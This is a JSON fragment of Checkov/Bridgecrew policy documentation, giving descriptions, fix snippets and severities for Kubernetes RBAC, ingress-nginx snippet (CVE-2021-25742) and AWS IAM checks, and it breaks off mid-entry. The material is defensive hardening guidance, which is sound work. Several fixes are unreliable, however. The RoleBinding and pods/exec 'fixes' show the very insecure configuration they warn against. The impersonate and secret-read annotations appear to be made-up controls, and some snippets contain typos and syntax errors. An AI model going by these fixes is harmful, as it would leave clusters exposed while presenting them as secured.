        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-only-makes-use-of-strong-cryptographic-ciphers",
        "description": "Kubelet does not use strong cryptographic ciphers\nDescription\nEnsure that the Kubelet is configured to only use strong cryptographic ciphers. TLS ciphers have had a number of known vulnerabilities and weaknesses, which can reduce the protection provided by them. By default Kubernetes supports a number of TLS ciphersuites including some that have security concerns, weakening the protection provided.\nFix - Buildtime \nKubernetes\nKind Pod\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-scheduler\n    tier: control-plane\n  name: kube-scheduler\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\n    image: gcr.io/google_containers/kube-scheduler-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-scheduler\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "LOW"
    },
    "CKV_K8S_154": {
        "url": "https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-alias-statements",
        "description": "NGINX Ingress has annotation snippets which contain alias statements\nDescription\nAllowing custom snippet annotations in ingress-nginx enables a user, who can create or update ingress objects, to obtain all secrets in the cluster. To still allow users leveraging the snippet feature it is recommend to remove any usage of alias.\nLearn more around CVE-2021-25742\nFix - Buildtime\nKubernetes\nYAMLapiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: example-ingress\n  namespace: developer\n  annotations:\n    kubernetes.io/ingress.class: nginx\n    nginx.ingress.kubernetes.io/rewrite-target: /$2\n    nginx.ingress.kubernetes.io/server-snippet: |\n      location ^~ \"/test\" {\n        default_type 'text/plain';\n-       alias /var/run;\n      }\nspec:\n  rules:\n  - http:\n      paths:\n        - path: /test\n          pathType: Prefix\n          backend:\n            service:\n              name: web\n              port:\n                number: 8080\n",
        "severity": "LOW"
    },
    "CKV_K8S_49": {
        "url": "https://docs.bridgecrew.io/docs/ensure-minimized-wildcard-use-in-roles-and-clusterroles",
        "description": "Wildcard use is not minimized in Roles and ClusterRoles\nDescription\nIn Kubernetes, roles and ClusterRoles are used to define the permissions that are granted to users, service accounts, and other entities in the cluster. Roles are namespaced and apply to a specific namespace, while ClusterRoles are cluster-wide and apply to the entire cluster.\nWhen you define a role or ClusterRole, you can use wildcards to specify the resources and verbs that the role applies to. For example, you might specify a role that allows users to perform all actions on all resources in a namespace by using the wildcard \"*\" for the resources and verbs.\nHowever, using wildcards can be a security risk because it grants broad permissions that may not be necessary for a specific role. If a role has too many permissions, it could potentially be abused by an attacker or compromised user to gain unauthorized access to resources in the cluster.\nFix - Buildtime\nKubernetes\nGoresource \"kubernetes_cluster_role\" \"pass\" {\n  metadata {\n    name = \"terraform-example\"\n  }\n\n  rule {\n    api_groups = [\"\"]\n    resources  = [\"namespaces\", \"pods\"]\n    verbs      = [\"get\", \"list\", \"watch\"]\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_155": {
        "url": "https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-control-over-validating-or-mutating-admission-webhook-configurations-are-minimized",
        "description": "ClusterRoles that grant control over validating or mutating admission webhook configurations are not minimized\nDescription\nClusterRoles that grant write permissions over admission webhook should be minimized to reduce powerful identities in the cluster. Validating admission webhooks can read every object admitted to the cluster, while mutating admission webhooks can read and mutate every object admitted to the cluster. As such, ClusterRoles that grant control over admission webhooks are granting near cluster admin privileges. Minimize such ClusterRoles to limit the number of powerful credentials that if compromised could take over the entire cluster. \nFix - Buildtime\nKubernetes\n\nKind: ClusterRole \nArgument: rules\nClusterRoles that grant the \"create\", \"update\" or \"patch\" verbs over the \"mutatingwebhookconfigurations\" or \"validatingwebhookconfigurations\" resources in the \"admissionregistration.k8s.io\" API group are granting control over admission webhooks.\n\nYAMLkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: <ClusterRole-name>\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\"]\n- apiGroups: [\"admissionregistration.k8s.io\"]\n  resources: [\"mutatingwebhookconfigurations\"]\n  verbs:\n  - list\n",
        "severity": "HIGH"
    },
    "CKV_K8S_156": {
        "url": "https://docs.bridgecrew.io/docs/ensure-clusterroles-that-grant-permissions-to-approve-certificatesigningrequests-are-minimized",
        "description": "ClusterRoles that grant permissions to approve CertificateSigningRequests are not minimized\nDescription\nClusterRoles that grant permissions to approve CertificateSigningRequests should be minimized to reduce powerful identities in the cluster. Approving CertificateSigningRequests allows one to issue new credentials for any user or group. As such, ClusterRoles that grant permissions to approve CertificateSigningRequests are granting cluster admin privileges. Minimize such ClusterRoles to limit the number of powerful credentials that if compromised could take over the entire cluster. \nFix - Buildtime\nKubernetes\n\nKind: ClusterRole \nArgument: rules\nClusterRoles that grant the \"update\" verbs over the \"certificatesigningrequests/approval\" and the \"approve\" verb over \"signers\" in the \"certificates.k8s.io\" API group are granting permissions to approve CertificateSigningRequests\n\nYAMLkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: <ClusterRole-name>\nrules:\n- apiGroups: [\"certificates.k8s.io\"]\n  resources: [\"certificatesigningrequests\"]\n  verbs: [\"get\", \"list\", \"create]\nx- apiGroups: [\"certificates.k8s.io\"]\nx  resources: [\"certificatesigningrequests/approval\"]\nx  verbs: [\"update\"]\nx- apiGroups: [\"certificates.k8s.io\"]\nx  resources: [\"signers\"]\nx  verbs: [\"approve\"]\n",
        "severity": "HIGH"
    },
    "CKV_K8S_157": {
        "url": "https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-bind-rolebindings-or-clusterrolebindings-are-minimized",
        "description": "Roles and ClusterRoles that grant permissions to bind RoleBindings or ClusterRoleBindings are not minimized\nDescription\nRole or ClusterRoles that grant permissions to bind RoleBindings or ClusterRoleBindings should be minimized to reduce powerful identities in the cluster. Such Roles and ClusterRoles can attach existing permissions (Roles and ClusterRoles) to arbitrary identities. RoleBindings grant permissions over a namespace, while ClusterRoleBindings grant permissions over the entire cluster. Minimize such Roles and ClusterRoles to limit the number of powerful credentials that if compromised could escalate privileges and possibly take over the entire cluster.\nFix - Buildtime\nKubernetes\n\nKind: ClusterRole, Role\nArgument: rules\nClusterRoles and Roles that grant the \"bind\" verbs over \"clusterrolebindings\" or \"rolebindings\" in the \"rbac.authorization.k8s.io\" API group should be minimized.\n\nYAMLkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: <ClusterRole-name>\nrules:\n- apiGroups: [\"rbac.authorization.k8s.io\"]\n  resources: [\"roles\", \"clusterroles\"]\n  verbs: [\"get\", \"list\", \"create\", \"update\"]\nx- apiGroups: [\"rbac.authorization.k8s.io\"]\nx  resources: [\"clusterrolebindings\"]\nx  verbs: [\"bind\"]\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_158": {
        "url": "https://docs.bridgecrew.io/docs/ensure-roles-and-clusterroles-that-grant-permissions-to-escalate-roles-or-clusterrole-are-minimized",
        "description": "Roles and ClusterRoles that grant permissions to escalate Roles or ClusterRole are not minimized\nDescription\nRole or ClusterRoles that grant permissions to escalate Roles or ClusterRoles should be minimized to reduce powerful identities in the cluster. Such Roles and ClusterRoles can add arbitrary permissions to arbitrary identities. Escalating Roles can add permissions over a namespace, while escalating ClusterRoles can add permissions over the entire cluster. Minimize such Roles and ClusterRoles to limit the number of powerful credentials that if compromised could escalate privileges and possibly take over the entire cluster.\nFix - Buildtime\nKubernetes\n\nKind: ClusterRole, Role\nArgument: rules\nClusterRoles and Roles that grant the \"escalate\" verbs over \"clusterroles\" or \"roles\" in the \"rbac.authorization.k8s.io\" API group should be minimized.\n\nYAMLkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: <ClusterRole-name>\nrules:\n- apiGroups: [\"rbac.authorization.k8s.io\"]\n  resources: [\"roles\", \"clusterrolebindings\"]\n  verbs: [\"get\", \"list\", \"create\", \"update\"]\nx- apiGroups: [\"rbac.authorization.k8s.io\"]\nx  resources: [\"clusterroles\"]\nx  verbs: [\"escalate\"]\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_152": {
        "url": "https://docs.bridgecrew.io/docs/prevent-nginx-ingress-annotation-snippets-which-contain-lua-code-execution",
        "description": "NGINX Ingress annotation snippets contain LUA code execution\nDescription\nAllowing custom snippet annotations in ingress-nginx enables a user, who can create or update ingress objects, to obtain all secrets in the cluster. To still allow users leveraging the snippet feature it is recommend to remove any usage of LUA code.\nLearn more around CVE-2021-25742\nFix - Buildtime\nKubernetes\nYAMLapiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: app-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/server-snippet: |\n-     lua_package_path  \"/etc/nginx/lua/?.lua;;\";\n      location / {\n        return 200 'OK';\n      }\n    kubernetes.io/ingress.class: \"nginx\"\nspec:\n  rules:\n  - http:    \n    paths:      \n      - path: /exp        \n        pathType: Prefix        \n        backend:          \n          service:            \n            name: some-service            \n            port:              \n              number: 1234\n",
        "severity": "LOW"
    },
    "CKV_K8S_153": {
        "url": "https://docs.bridgecrew.io/docs/prevent-all-nginx-ingress-annotation-snippets",
        "description": "NGINX Ingress has annotation snippets\nDescription\nAllowing custom snippet annotations in ingress-nginx enables a user, who can create or update ingress objects, to obtain all secrets in the cluster. The safest way is to disallow any usage of annotation snippets.\nLearn more around CVE-2021-25742\nFix - Buildtime\nKubernetes\nYAMLapiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: app-ingress\n  annotations:  \n-   nginx.ingress.kubernetes.io/server-snippet: |\n-     location / {\n-       return 200 'OK';\n-     }\n    kubernetes.io/ingress.class: \"nginx\"\nspec:\n  rules:\n  - http:    \n    paths:      \n      - path: /exp        \n        pathType: Prefix        \n        backend:          \n          service:            \n            name: some-service            \n            port:              \n              number: 1234\n",
        "severity": "LOW"
    },
    "CKV2_K8S_1": {
        "url": "https://docs.bridgecrew.io/docs/rolebinding-should-not-allow-privilege-escalation-to-a-serviceaccount-or-node-on-other-rolebinding",
        "description": "RoleBinding should not allow privilege escalation to a ServiceAccount or Node on other RoleBinding\nDescription\nIn Kubernetes, a RoleBinding is used to grant specific permissions to a user or group of users. These permissions, also known as \"roles,\" determine what actions a user is allowed to perform within a Kubernetes cluster.\nIt is important to ensure that RoleBindings are configured in a way that does not allow privilege escalation. This means that a user with a RoleBinding should not be able to gain access to privileges that they are not explicitly granted through their RoleBinding.\nAllowing privilege escalation would mean that a user could potentially gain unauthorized access to sensitive information or perform actions that they are not supposed to be able to perform. This could pose a security risk to the cluster, so it is important to prevent privilege escalation in RoleBindings.\nOne way to prevent privilege escalation in RoleBindings is to make sure that they are not granted to ServiceAccounts or Nodes. This is because ServiceAccounts and Nodes are not typically associated with individual users, so granting a RoleBinding to them could potentially allow any user who is able to access the ServiceAccount or Node to gain the privileges granted by the RoleBinding. This could lead to privilege escalation, so it is generally best to avoid granting RoleBindings to ServiceAccounts and Nodes.\nFix - Buildtime\nYAMLapiVersion: v1\nkind: RoleBinding\nmetadata:\n  name: restricted-access\nsubjects:\n- kind: ServiceAccount\n  name: my-service-account\n- kind: Node\n  name: my-node\nroleRef:\n  kind: ClusterRole\n  name: restricted-access\n  apiGroup: rbac.authorization.k8s.io\n",
        "severity": "CRITICAL"
    },
    "CKV2_K8S_2": {
        "url": "https://docs.bridgecrew.io/docs/granting-create-permissions-to-nodesproxy-or-podsexec-sub-resources-allows-potential-privilege-escalation",
        "description": "Granting create permissions to nodes/proxy or pods/exec sub resources allows potential privilege escalation\nDescription\nIn Kubernetes, granting the create permission to the nodes/proxy or pods/exec sub resources can potentially allow privilege escalation. This is because these sub resources enable users to access and control the Kubernetes nodes and pods in the cluster.\nIf a user has the create permission for the nodes/proxy sub resource, they would be able to create a proxy to any node in the cluster. This would allow them to access the node as if they were directly logged in to it, potentially giving them access to sensitive information or allowing them to perform actions that they are not supposed to be able to perform.\nSimilarly, if a user has the create permission for the pods/exec sub resource, they would be able to execute commands on any pod in the cluster. This could allow them to gain access to the containers running on the pod, potentially giving them access to sensitive information or allowing them to perform unauthorized actions.\nTherefore, it is important to carefully consider whether to grant the create permission for the nodes/proxy and pods/exec sub resources, as doing so could potentially allow privilege escalation. It may be safer to only grant these permissions to trusted users who have a legitimate need for them, and to monitor their usage to ensure that they are not being used for unauthorized purposes.\nFix - Buildtime\nYAMLapiVersion: v1\nkind: ClusterRole\nmetadata:\n  name: restricted-access\nrules:\n- apiGroups: [\"\"]\n  resources: [\"nodes/proxy\", \"pods/exec\"]\n  verbs: [\"create\"]\n",
        "severity": "HIGH"
    },
    "CKV2_K8S_3": {
        "url": "https://docs.bridgecrew.io/docs/no-serviceaccountnode-should-have-impersonate-permissions-for-groupsusersservice-accounts",
        "description": "No ServiceAccount/Node should have impersonate permissions for groups/users/service-accounts\nDescription\nIn Kubernetes, the impersonate permission allows a user or service account to perform actions as if they were another user or service account. This can be useful in certain situations, such as when one service needs to access another service on behalf of a user.\nHowever, allowing a ServiceAccount or Node to have impersonate permissions for other users or service accounts can potentially allow privilege escalation. This is because ServiceAccounts and Nodes are not typically associated with individual users, so granting them the ability to impersonate other users could potentially allow any user who is able to access the ServiceAccount or Node to gain the privileges of the impersonated user.\nFor example, if a ServiceAccount has the impersonate permission for a user who has admin privileges, any user who is able to access the ServiceAccount would be able to perform actions as if they were an admin user. This could lead to unauthorized access to sensitive information or the ability to perform unauthorized actions, so it is generally best to avoid granting impersonate permissions to ServiceAccounts and Nodes.\nFix - Buildtime\nYAMLapiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: my-service-account\n  annotations:\n    authorization.k8s.io/impersonate: \"false\"\n",
        "severity": "CRITICAL"
    },
    "CKV2_K8S_4": {
        "url": "https://docs.bridgecrew.io/docs/serviceaccounts-and-nodes-that-can-modify-servicesstatus-may-set-the-statusloadbalanceringressip-field-to-exploit-the-unfixed-cve-2020-8554-and-launch-mitm-attacks-against-the-cluster",
        "description": "ServiceAccounts and nodes that can modify services/status may set the status.loadBalancer.ingress.ip field to exploit the unfixed CVE-2020-8554 and launch MiTM attacks against the cluster\nDescription\nIn Kubernetes, a ServiceAccount is an account that is associated with a specific service. A ServiceAccount can be granted specific permissions, known as \"roles,\" that determine what actions it is allowed to perform within a Kubernetes cluster.\nOne potential issue with ServiceAccounts is that they can be used to exploit a vulnerability known as CVE-2020-8554. This vulnerability allows a ServiceAccount that has the ability to modify services and their status to set the status.loadBalancer.ingress.ip field to an arbitrary IP address.\nIf a ServiceAccount with these permissions sets the status.loadBalancer.ingress.ip field to an IP address that they control, they would be able to launch a man-in-the-middle (MiTM) attack against the cluster. This would allow them to intercept and modify traffic between the cluster and the specified IP address, potentially allowing them to gain access to sensitive information or perform unauthorized actions.\nTo prevent this type of attack, it is important to ensure that ServiceAccounts with the ability to modify services and their status do not have the ability to set the status.loadBalancer.ingress.ip field. This can be done by carefully configuring the roles and permissions associated with the ServiceAccounts in the cluster.\nIt is also important to note that nodes, which are the physical or virtual machines that run the Kubernetes cluster, can also potentially exploit the CVE-2020-8554 vulnerability if they have the ability to modify services and their status. Therefore, it is also important to ensure that nodes do not have these permissions to prevent potential MiTM attacks against the cluster.\nFix - Buildtime\nYAMLapiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: my-service-account\n  annotations:\n    services/status/patch: \"[]\"\n",
        "severity": "MEDIUM"
    },
    "CKV2_K8S_5": {
        "url": "https://docs.bridgecrew.io/docs/no-serviceaccountnode-should-be-able-to-read-all-secrets",
        "description": "No ServiceAccount/Node should be able to read all secrets\nDescription\nIn Kubernetes, a ServiceAccount is an account that is associated with a specific service. A ServiceAccount can be granted specific permissions, known as \"roles,\" that determine what actions it is allowed to perform within a Kubernetes cluster.\nOne potential issue with ServiceAccounts is that they could potentially be granted the ability to read all secrets in a Kubernetes cluster. This would allow the ServiceAccount to access sensitive information such as passwords, API keys, and other sensitive data that is stored as secrets in the cluster.\nAllowing a ServiceAccount to read all secrets could pose a security risk to the cluster, as it could potentially allow unauthorized access to sensitive information. Therefore, it is generally best to avoid granting ServiceAccounts the ability to read all secrets in a cluster.\nIt is also important to note that nodes, which are the physical or virtual machines that run the Kubernetes cluster, can also potentially be granted the ability to read all secrets. Therefore, it is also important to ensure that nodes do not have this ability to prevent potential unauthorized access to sensitive information.\nFix - Buildtime\nYAMLapiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: my-service-account\n  annotations:\n    authorization.k8s.io/get: \"[]\"\n",
        "severity": "HIGH"
    },
    "CKV_AWS_10": {
        "url": "https://docs.bridgecrew.io/docs/iam_9-1",
        "description": "AWS IAM password policy does not have a minimum of 14 characters\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain a minimum of 14 characters, this increases security, especially from a brute force attack.\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\nTo manually set the password policy with a minimum length, follow these steps:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSet Minimum password length to 14 or greater. \nClick Apply password policy.\n\nCLI Command\nTo change the password policy, use the following command:\nBashaws iam update-account-password-policy --minimum-password-length 14\n\n\ud83d\udcd8NoteAll commands starting with aws iam update-account-password-policy can be combined into a single command.\nFix - Buildtime\nTerraform\nGoresource \"aws_iam_account_password_policy\" \"strict\" {\n  minimum_password_length        = 14\n  require_lowercase_characters   = true\n  require_numbers                = true\n  require_uppercase_characters   = true\n  require_symbols                = true\n  allow_users_to_change_password = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_9": {
        "url": "https://docs.bridgecrew.io/docs/iam_11",
        "description": "AWS IAM password policy does not expire in 90 days\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy should require passwords to be rotated or expired within a specified timeframe, we recommend passwords expire after 90 days or less. \nReducing the lifetime of a password by enforcing regular password changes increases account resilience towards:\n\nBrute force attack;\nPasswords being stolen or compromised, sometimes without your knowledge;\nWeb filters and proxy servers intercepting and recording traffic, including encrypted data;\nUse of the same user password across work, email, and personal systems; and\nEnd user workstations compromised by a keystroke logger. \n\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\nTo manually set the password policy with a minimum length, use the following command:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSelect Enable password expiration .\nFor Password expiration period (in days)\" enter 90** or less. \nClick Apply password policy.\n\nCLI Command\nChange the password policy using CLI command:\nBashaws iam update-account-password-policy --max-password-age 90\n\nFix - Buildtime\nTerraform\nGoresource \"aws_iam_account_password_policy\" \"strict\" {\n  minimum_password_length        = 8\n  require_lowercase_characters   = true\n  require_numbers                = true\n  require_uppercase_characters   = true\n  require_symbols                = true\n  apassword_reuse_prevention     = 24\n  max_password_age               = 89\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_13": {
        "url": "https://docs.bridgecrew.io/docs/iam_10",
        "description": "AWS IAM password policy allows password reuse\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy must prevent reuse of passwords. Each password should be brand new to increase security, especially from a brute force attack.\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\nTo manually set the password policy with a minimum length, follow these steps:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSelect Prevent password reuse.\nFor Number of passwords to remember\" enter 24**. \nClick Apply password policy.\n\nCLI Command\nTo change the password policy, use the following command:\nBashaws iam update-account-password-policy --password-reuse-prevention 24\n\nFix - Buildtime\nTerraform\nGoresource \"aws_iam_account_password_policy\" \"strict\" {\n  minimum_password_length        = 8\n  require_lowercase_characters   = true\n  require_numbers                = true\n  require_uppercase_characters   = true\n  require_symbols                = true\n  apassword_reuse_prevention  = 24\n}\n",
        "severity": "HIGH"
    },
    "CKV_AWS_40": {
        "url": "https://docs.bridgecrew.io/docs/iam_16-iam-policy-privileges-1",
        "description": "IAM policies are not only attached to Groups and Roles\nDescription\nBy default, IAM users, groups, and roles have no access to AWS resources. IAM policies are the means by which privileges are granted to users, groups, or roles. \nAssigning privileges at the group or role level reduces the complexity of access management as the number of users increase. Reducing access management complexity may in-turn reduce opportunity for a principal to inadvertently receive or retain excessive privileges. \nWe recommend that IAM policies are applied directly to groups and roles, but not to users.\nFix - Buildtime\nCloudFormation\n\nResource: AWS::IAM::Policy\nArguments: Properties.Users\n\nYAMLResources:\n  ExamplePolicy:\n    Type: 'AWS::IAM::Policy'\n    Properties:\n      ...\n-     Users:\n-       - example_user\n",
        "severity": "LOW"
    },
    "CKV_AWS_1": {
        "url": "https://docs.bridgecrew.io/docs/iam_23",
        "description": "IAM policies that allow full administrative privileges are created\nDescription\nIAM policies are the means by which privileges are granted to users, groups, and roles. Standard security practice is to grant least privilege\u201a this is granting only the permissions required to perform a task. Providing full administrative may expose resources to potentially unwanted actions.\nWe recommend:\n\nYou determine what users need to do, then craft policies allowing them to perform only those tasks. \nYou do not allow all users full administrative privileges. \nYou start with a minimum set of permissions and grant additional permissions as necessary.\nIAM policies that have a statement with Effect: Allow with Action:  over Resource:  are removed. \n\nFix - Runtime \nAWS Console\nTo detach the policy that has full administrative privileges, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon IAM console.\nIn the navigation pane, click Policies and then search for the policy name found in the audit step. \nSelect the policy to be deleted.\nIn the Policy Action menu, select first Detach.\nSelect all Users, Groups, and Roles that have this policy attached.\nClick Detach Policy. \nIn the Policy Action menu, select Detach.\n\nCLI Command\nTo detach the policy that has full administrative privileges as found in the audit step, use the following commands:\n\nLists all IAM users, groups, and roles that the specified managed policy is attached to. \n\nBashaws iam list-entities-for-policy --policy-arn <policy_arn>\n\n\nDetach the policy from all IAM Users. \n\nBash   aws iam detach-user-policy --user-name <iam_user> --policy-arn <policy_arn> \n\n\nDetach the policy from all IAM Groups.\n\nBash   aws iam detach-group-policy --group-name <iam_group> --policy-arn <policy_arn> \n\n\nDetach the policy from all IAM Roles.\n\nBash   aws iam detach-role-policy --role-name <iam_role> --policy-arn <policy_arn>\n\nFix - Buildtime \nTerraform\nResource: aws_iam_policy\nGoresource \"aws_iam_policy\" \"pass1\" {\n  name   = \"pass1\"\n  path   = \"/\"\n  policy = <<POLICY\n{\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"s3:ListBucket*\",\n        \"s3:HeadBucket\",\n        \"s3:Get*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": [\n        \"arn:aws:s3:::b1\",\n        \"arn:aws:s3:::b1/*\",\n        \"arn:aws:s3:::b2\",\n        \"arn:aws:s3:::b2/*\"\n      ],\n      \"Sid\": \"\"\n    },\n    {\n      \"Action\": \"s3:PutObject*\",\n      \"Effect\": \"Allow\",\n      \"Resource\": \"arn:aws:s3:::b1/*\",\n      \"Sid\": \"\"\n    }\n  ],\n  \"Version\": \"2012-10-17\"\n}\nPOLICY\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_121": {
        "url": "https://docs.bridgecrew.io/docs/logging_5-enable-aws-config-regions",
        "description": "AWS config is not enabled in all regions\nDescription\nAWS Config is a web service that performs the configuration management of supported AWS resources within your account and delivers log files to you. The recorded information includes: the configuration item (AWS resource), relationships between configuration items (AWS resources), and any configuration changes between resources. The AWS configuration item history captured by AWS Config enables security analysis, resource change tracking, and compliance auditing. \nWe recommend you enable AWS Config in all regions. \nFix - Runtime \nAWS Console\nTo implement AWS Config configuration using the AWS Management Console, follow these steps:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nAt the top right of the console select the region you want to focus on. \nClick Services. \nClick Config. \nDefine which resources you want to record in the selected region. Include global resources (IAM resources).\nSelect an S3 bucket in the same account, or in another managed AWS account. \nCreate an SNS Topic from the same AWS account, or from another managed AWS account. \n\nCLI Command\nTo change the policy using the following steps and commands:\n\nEnsure there is an appropriate S3 bucket, SNS topic, and IAM role per the AWS Config Service prerequisites. \nSet up the configuration recorder: \n\nBashaws configservice subscribe \n--s3-bucket my-config-bucket \n--sns-topic arn:aws:sns:us-east-1:012345678912:my-config-notice \n--iam-role arn:aws:iam::012345678912:role/myConfigRole \n\n\nStart the configuration recorder: \n\nBashstart-configuration-recorder \n--configuration-recorder-name <value>\n\nFix - Buildtime \nTerraform\n\nResource: aws_config_configuration_aggregator\nArgument: all_regions \n\nGoresource \"aws_config_configuration_aggregator\" \"organization\" {\n  name = \"example\"\n  account_aggregation_source {\n    account_ids  = [\"123456789012\"]\n+   all_regions  = true\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_49": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_iam_43",
        "description": "IAM policy documents allow * (asterisk) as a statement's action\nDescription\nThe Action element describes the specific action or actions that will be allowed or denied. Statements must include either an Action or NotAction element. Each AWS service has its own set of actions that describe tasks that can be performed with that service. Specify a value using a namespace that identifies a service, for example, iam, ec2 sqs, sns, s3, followed by the name of the action to be allowed or denied. The name must match an action that is supported by the service.\nWe recommend you do not allow \"*\" (all resource) statements as part of action elements. This level of access could potentially grant unwanted and unregulated access to anyone given this policy document setting. We recommend you to write a refined policy describing the specific action allowed or required by the specific policy holder.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon IAM console.\nIn the navigation pane, choose Policies.\nIn the list of policies, choose the policy name of the policy to edit. You can use the Filter menu and the search box to filter the list of policies.\nChoose the Permissions tab, then choose Edit Policy.\nIdentify any Action statements permitting actions access to all resources (\"*\").\nOn the Review page, review the policy Summary, then click Save Changes.\n\nFix - Buildtime \nTerraform\n\nArgument: statement\nAttribute: action\nExample fix:\n\naws_iam_policyresource \"aws_iam_policy\" \"example\" {\n   # ... other configuration ...\n   policy = <<POLICY\n {\n   \"Version\": \"2012-10-17\",\n   \"Statement\": {\n     \"Effect\": \"Allow\",\n-    \"Action\": \"*\",\n     \"Resource\": \"*\"\n   }\n",
        "severity": "HIGH"
    },
    "CKV_AWS_12": {
        "url": "https://docs.bridgecrew.io/docs/iam_8",
        "description": "AWS IAM password policy does not have a number\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one number, this increases security, especially from a brute force attack.\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\nTo manually set the password policy with a minimum length, follow these steps:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSelect Require at least one number. \nClick Apply password policy.\n\nCLI Command\nTo change the password policy, use the following command:\nBashaws iam update-account-password-policy --require-numbers\n\n\ud83d\udcd8NoteAll commands starting with aws iam update-account-password-policy can be combined into a single command.\nFix - Buildtime\nTerraform\nGoresource \"aws_iam_account_password_policy\" \"strict\" {\n  minimum_password_length        = 8\n  require_lowercase_characters   = true\n  require_numbers                = true\n  require_uppercase_characters   = true\n  require_symbols                = true\n  allow_users_to_change_password = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_60": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_iam_44",
        "description": "IAM role does not allow only specific services or principals to be assumed\nDescription\nThe IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has an AWS identity with permission policies that determine what the identity can and cannot do in AWS. When a user assumes a role, it is provided with temporary security credentials for a bounded session.\nThe list of principals able to assume a role should be limited as much as possible, and should not include \"*\", meaning that any authenticated identity across all of AWS can assume the role.\nWe recommend that you define fine-grained roles for specific services or principles. For example, when setting up an AWS service role it is recommended to include only the permissions required for the service to access the AWS resources required. Alternatively, you can use a principal as an entity that can perform actions and access resources. The main benefit of the principal entity is to limit the use of wildcards in the policy document.\nFix - Runtime \nAWS IAM Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon IAM console.\nClick Roles, and find the role to update.\nClick the Trust relationships tab.\nClick Show policy document or Edit trust relationship to view the policy document.\nAfter clicking Edit trust relationship, remove any \"Allow\" statements that have an AWS Principal including \"*\".\nClick Update Trust Policy.\n\nFix - Buildtime \nTerraform\nGoresource \"aws_iam_role\" \"test_role\" {\n  name = \"test_role\"\n    ...\n  assume_role_policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": \"sts:AssumeRole\",\n      \"Principal\": {\n        \"AWS\": [\n-         \"*\"\n        ]\n      },\n      \"Effect\": \"Allow\",\n      \"Sid\": \"\"\n    }\n\nCloudFormation\n\nResource: AWS::IAM::Role\nArgument: Properties.AssumeRolePolicyDocument.Statement\n\nYAMLType: 